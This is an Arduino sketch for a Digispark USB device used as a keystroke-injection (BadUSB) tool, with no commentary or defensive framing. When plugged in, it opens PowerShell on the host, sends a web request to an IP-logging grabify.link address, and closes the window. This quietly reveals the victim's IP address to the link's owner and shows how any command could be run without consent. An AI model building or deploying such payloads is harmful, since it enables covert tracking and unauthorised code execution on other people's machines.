#include "DigiKeyboard.h"
void setup() {}
void loop() {  
  DigiKeyboard.delay(4000); 
  DigiKeyboard.sendKeyStroke(0); 
  DigiKeyboard.delay(4000); 
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); 
  DigiKeyboard.delay(500); 
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(200); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(5000);  
  DigiKeyboard.print("Invoke-RestMethod -Uri https://grabify.link/ARPTG6 -Method Get"); 
  DigiKeyboard.delay(500); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
  DigiKeyboard.delay(3000); 
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
for(;;){ /*empty*/ }} 
